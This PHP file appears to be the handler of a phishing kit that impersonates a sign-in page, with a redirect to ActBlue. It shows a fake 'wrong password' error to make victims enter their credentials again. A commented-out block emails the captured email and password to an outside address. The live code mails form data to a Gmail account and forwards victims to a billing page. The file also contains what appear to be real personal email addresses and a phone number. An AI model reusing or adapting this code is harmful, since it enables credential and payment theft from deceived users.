<?php
session_start();
if(!isset($_SESSION["clicked"])){
  $_SESSION["clicked"] = "1";
  /*echo $_SESSION["clicked"];*/
  header("Location: sign-in.php?message=wrong password");
}else{

/*$email = $_POST['email'];
$password = $_POST['password'];
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
$from = "from email";
$to = "to email";
$subject = "login details";
$message = "email: ".$email."password: ".$password;
$headers = "From:" . $from;
session_unset();
if(mail($to,$subject,$message, $headers)) {
    header("Location: secure.actblue.com");
} else {
    echo "operation failed!";
}

the other steves Mail*/



// Define some constants
define( "RECIPIENT_NAME", "John Doe" );
define( "RECIPIENT_EMAIL", "valentine4d@gmail.com" );


// Read the form values
$success = false;
$senderName = "entropy";
$senderEmail = "ferdinantino1992@gmail.com";
$senderPhone =  "08149428491";
$senderSubject =  "test";
$message = "this is just a test";

// If all values exist, send the email
if ( $senderName && $senderEmail && $senderPhone && $senderSubject && $message) {
  $recipient = RECIPIENT_NAME . " <" . RECIPIENT_EMAIL . ">";
  $headers = "From: " . $senderName . "";
  $msgBody = " Email: ". $senderEmail . " Phone: ". $senderPhone . " Subject: ". $senderSubject . " Message: " . $message . "";
  $success = mail( $recipient, $headers, $msgBody );

  //Set Location After Successsfull Submission
  session_unset();
  header('Location: billing.php?message=Successfull');
}

else{
	//Set Location After Unsuccesssfull Submission
  	header('Location: sign-in.php?message=Failed');	
}

}
?>